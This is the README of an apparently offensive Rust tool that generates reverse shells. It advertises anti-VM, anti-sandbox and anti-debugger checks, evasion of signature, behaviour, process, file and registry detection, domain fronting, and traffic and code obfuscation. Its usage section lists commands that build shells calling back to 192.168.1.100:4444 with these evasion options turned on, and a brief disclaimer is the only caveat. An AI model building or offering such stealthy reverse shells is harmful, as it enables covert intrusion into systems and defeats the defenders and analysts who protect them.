# Foxhole

A stealthy, cross-platform reverse shell generator in Rust.

## Features

### Multiple Connection Methods
- TCP
- UDP
- WebSocket
- HTTP (planned)
- DNS tunneling (planned)
- ICMP tunneling (planned)

### Advanced Anti-Detection
- VM detection
- Sandbox detection
- Debugger detection
- Analysis tool detection

### Defense Evasion
- Signature detection evasion
- Behavior detection evasion
- Network detection evasion
- Process detection evasion
- File detection evasion
- Registry detection evasion

### Network Stealth
- Traffic pattern manipulation
- Domain fronting
- Traffic encryption
- Traffic fragmentation
- Traffic timing
- Normal traffic simulation

### Obfuscation Techniques
- XOR encryption
- RC4 encryption
- AES encryption
- Control flow obfuscation
- Anti-disassembly techniques

### Security Features
- TLS support
- Proxy support
- Connection retry logic
- Timeout handling
- Error handling

## Requirements

- Rust 1.70 or later
- Windows 10/11 or Linux
- OpenSSL development libraries

## Installation

1. Clone the repository:
```bash
git clone https://github.com/yourusername/foxhole.git
cd foxhole
```

2. Build the project:
```bash
cargo build --release
```

## Usage

### Basic Usage

```bash
# Generate a reverse shell
cargo run --release -- -h 192.168.1.100 -p 4444

# Generate a reverse shell with TLS
cargo run --release -- -h 192.168.1.100 -p 4444 --tls

# Generate a reverse shell with proxy support
cargo run --release -- -h 192.168.1.100 -p 4444 --proxy http://proxy.example.com:8080

# Generate a reverse shell with custom retry settings
cargo run --release -- -h 192.168.1.100 -p 4444 --retry-count 5 --retry-delay 10
```

### Advanced Usage

```bash
# Generate a reverse shell with multiple connection methods
cargo run --release -- -h 192.168.1.100 -p 4444 --connection-method tcp,websocket

# Generate a reverse shell with anti-VM and anti-sandbox detection
cargo run --release -- -h 192.168.1.100 -p 4444 --anti-vm --anti-sandbox

# Generate a reverse shell with defense evasion
cargo run --release -- -h 192.168.1.100 -p 4444 --evade-signature --evade-behavior --evade-network --evade-process --evade-file --evade-registry

# Generate a reverse shell with network stealth
cargo run --release -- -h 192.168.1.100 -p 4444 --network-stealth --domain-fronting --traffic-encryption --traffic-fragmentation --traffic-timing

# Generate a reverse shell with advanced obfuscation
cargo run --release -- -h 192.168.1.100 -p 4444 --obfuscate --encrypt
```

## Command Line Arguments

- `-h, --host <HOST>`: Target host IP address
- `-p, --port <PORT>`: Target port number
- `--tls`: Enable TLS support
- `--proxy <PROXY>`: Proxy server URL
- `--retry-count <COUNT>`: Number of connection retries
- `--retry-delay <DELAY>`: Delay between retries in seconds
- `--connection-method <METHODS>`: Comma-separated list of connection methods
- `--anti-vm`: Enable anti-VM detection
- `--anti-sandbox`: Enable anti-sandbox detection
- `--evade-signature`: Enable signature detection evasion
- `--evade-behavior`: Enable behavior detection evasion
- `--evade-network`: Enable network detection evasion
- `--evade-process`: Enable process detection evasion
- `--evade-file`: Enable file detection evasion
- `--evade-registry`: Enable registry detection evasion
- `--network-stealth`: Enable network stealth features
- `--domain-fronting`: Enable domain fronting
- `--traffic-encryption`: Enable traffic encryption
- `--traffic-fragmentation`: Enable traffic fragmentation
- `--traffic-timing`: Enable traffic timing
- `--obfuscate`: Enable code obfuscation
- `--encrypt`: Enable encryption

## Defense Evasion Features

### Signature Detection Evasion
- Modifies process name and path
- Modifies process memory
- Changes module names
- Alters memory patterns

### Behavior Detection Evasion
- Simulates normal process behavior
- Modifies process activity patterns
- Changes module behavior
- Alters memory access patterns

### Network Detection Evasion
- Modifies network behavior
- Changes network patterns
- Alters connection characteristics
- Simulates normal network activity

### Process Detection Evasion
- Hides process from detection
- Modifies process memory
- Changes process characteristics
- Alters process behavior

### File Detection Evasion
- Modifies file attributes
- Changes file content
- Alters file patterns
- Simulates normal file activity

### Registry Detection Evasion
- Modifies registry entries
- Changes registry patterns
- Alters registry behavior
- Simulates normal registry activity

## Network Stealth Features

### Traffic Pattern Manipulation
- Customizable packet sizes
- Configurable inter-arrival times
- Protocol selection
- Encryption options
- Fragmentation strategies

### Domain Fronting
- HTTP/HTTPS domain fronting
- Custom host headers
- Connection keep-alive
- TLS support

### Traffic Encryption
- XOR encryption
- RC4 encryption
- AES encryption
- Custom key support

### Traffic Fragmentation
- Fixed-size fragmentation
- Random-size fragmentation
- Custom fragment sizes
- Fragment reassembly

### Traffic Timing
- Configurable delays
- Random timing patterns
- Normal traffic simulation
- Activity intervals

### Normal Traffic Simulation
- Browser-like behavior
- System process simulation
- Network activity patterns
- Resource usage patterns

## Disclaimer

This tool is for educational and research purposes only. The author is not responsible for any misuse or damage caused by this program.

## License

This project is licensed under the MIT License - see the LICENSE file for details. 